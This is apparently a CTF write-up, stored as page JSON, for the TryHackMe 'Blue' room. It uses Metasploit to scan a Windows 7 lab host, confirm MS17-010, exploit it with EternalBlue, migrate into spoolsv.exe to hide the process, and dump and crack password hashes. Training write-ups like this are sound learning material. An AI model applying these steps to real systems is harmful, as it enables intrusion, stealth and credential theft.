{"pageProps":{"article":{"title":"TryHackMe - Blue","tags":["CTF","THM"],"description":"Deploy & hack into a Windows machine, leveraging common misconfigurations issues.","language":null,"content":[{"Start":{"Heading":["H1",null,[]]}},{"Text":"TryHackMe - Blue"},{"End":{"Heading":["H1",null,[]]}},{"Start":"BlockQuote"},{"Start":"Paragraph"},{"Text":"The room link can be found at"},"SoftBreak",{"Start":{"Link":["Inline","https://tryhackme.com/room/blue",""]}},{"Text":"TryHackMe - Blue"},{"End":{"Link":["Inline","https://tryhackme.com/room/blue",""]}},{"End":"Paragraph"},{"End":"BlockQuote"},{"Start":"Paragraph"},{"Text":"For this room, I will be using the Metasploit framework."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Recon"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"We begin with a Nmap of the box to see the services and get their version."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 > db_nmap -sC -sV 10.10.47.219\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Now we can see all the running services with the "},{"Code":"services"},{"Text":" command."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 > services\nServices\n========\n\nhost           port   proto  name               state  info\n----           ----   -----  ----               -----  ----\n10.10.47.219   135    tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn\n10.10.47.219   445    tcp    microsoft-ds       open   Windows 7 Professional 7601 Service Pack 1 microsoft-ds workgroup: WORKGROUP\n10.10.47.219   3389   tcp    ssl/ms-wbt-server  open\n10.10.47.219   49152  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49153  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49154  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49158  tcp    msrpc              open   Microsoft Windows RPC\n10.10.47.219   49160  tcp    msrpc              open   Microsoft Windows RPC\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"On this machine, we will focus on the "},{"Start":"Strong"},{"Text":"SMB"},{"End":"Strong"},{"Text":" service which is on port "},{"Code":"445"},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"We can gather more information using the module"},"SoftBreak",{"Code":"auxiliary/scanner/smb/smb_version"},{"Text":". Running it the services page will lock"},"SoftBreak",{"Text":"more like this."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"10.10.47.219  445    tcp    smb                open   Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Also we run "},{"Code":"auxiliary/scanner/smb/smb1"},{"Text":" to check if the box has support for"},"SoftBreak",{"Text":"SMBv1."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 auxiliary(scanner/smb/smb1) > run\n\n[+] 10.10.47.219:445      - 10.10.47.219 supports SMBv1 dialect.\n[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"As the machine name implies the box could be exploitable via "},{"Start":"Strong"},{"Text":"EternalBlue"},{"End":"Strong"},{"Text":"."},"SoftBreak",{"Text":"Since the machine has "},{"Start":"Strong"},{"Text":"Windows 7"},{"End":"Strong"},{"Text":" installed and "},{"Start":"Strong"},{"Text":"SMBv1"},{"End":"Strong"},{"Text":" enabled, it is most"},"SoftBreak",{"Text":"likely vulnerable. You can read more here"},"SoftBreak",{"Start":{"Link":["Inline","https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010",""]}},{"Text":"Microsoft - EternalBlue"},{"End":{"Link":["Inline","https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010",""]}},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"We can check if the machine is vulnerable by running the module"},"SoftBreak",{"Code":"auxiliary/scanner/smb/smb_ms17_010"},{"Text":"."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 auxiliary(scanner/smb/smb_ms17_010) > run\n\n[+] 10.10.47.219:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)\n[*] 10.10.47.219:445      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Html":"<!--more-->\n"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Gain Access"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"Now we search for an exploit we can use in Metasploit."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"msf5 > search ms17_010\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Select it using "},{"Code":"use 2"},{"Text":", set "},{"Code":"LHOST"},{"Text":" and "},{"Code":"RHOST"},{"Text":", and run it. The exploit could"},"SoftBreak",{"Text":"fail multiple times. But if you continue trying it will succeed. You could also"},"SoftBreak",{"Text":"try setting the payload to "},{"Code":"generic/shell_reverce_tcp"},{"Text":"."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"Now we have a meterpreter session on the box."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Escalate"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"If you have a simple shell you can use the"},"SoftBreak",{"Code":"post/multi/manage/shell_to_meterpreter"},{"Text":" module to upgrade your shell."},{"End":"Paragraph"},{"Start":"Paragraph"},{"Text":"If you have a meterpreter shell you can check who you are with:"},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}},{"Start":"Paragraph"},{"Text":"Since we are "},{"Start":"Strong"},{"Text":"NT AUTHORITY\\SYSTEM"},{"End":"Strong"},{"Text":" we have full administrator access to the"},"SoftBreak",{"Text":"box. With this privilege, we can migrate our process to "},{"Code":"spoolsv.exe"},{"Text":" to hide"},"SoftBreak",{"Text":"our process. We can use "},{"Code":"ps"},{"Text":" and "},{"Code":"migrate"},{"Text":" command for this. Alternatively, we"},"SoftBreak",{"Text":"can use "},{"Code":"run post/windows/manage/migrate"},{"Text":" to spawn a "},{"Start":"Emphasis"},{"Text":"notepad"},{"End":"Emphasis"},{"Text":" process and"},"SoftBreak",{"Text":"migrate to it."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Cracking"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"To crack the passwords first we need to dump them. There are two ways to do"},"SoftBreak",{"Text":"this, we can use the "},{"Code":"hashdump"},{"Text":" command and crack them outside of Metasploit."},"SoftBreak",{"Text":"Else we can run the post module "},{"Code":"use post/windows/gather/hashdump"},{"Text":" this will"},"SoftBreak",{"Text":"save the hashes in the database. Then we run"},"SoftBreak",{"Code":"use auxiliary/analyze/crack_windows"},{"Text":" to crack them with "},{"Start":"Strong"},{"Text":"john"},{"End":"Strong"},{"Text":". The"},"SoftBreak",{"Text":"challenge suggests us to use the wordlist "},{"Start":"Strong"},{"Text":"rockyou.txt"},{"End":"Strong"},{"Text":"."},{"End":"Paragraph"},{"Start":{"Heading":["H2",null,[]]}},{"Text":"Find flags"},{"End":{"Heading":["H2",null,[]]}},{"Start":"Paragraph"},{"Text":"To find the flag you can use the "},{"Code":"search"},{"Text":" command with the file name from the"},"SoftBreak",{"Text":"root directory."},{"End":"Paragraph"},{"Start":{"CodeBlock":{"Fenced":"bash"}}},{"Text":"meterpreter > search -f flag*\n"},{"End":{"CodeBlock":{"Fenced":"bash"}}}]}},"__N_SSG":true}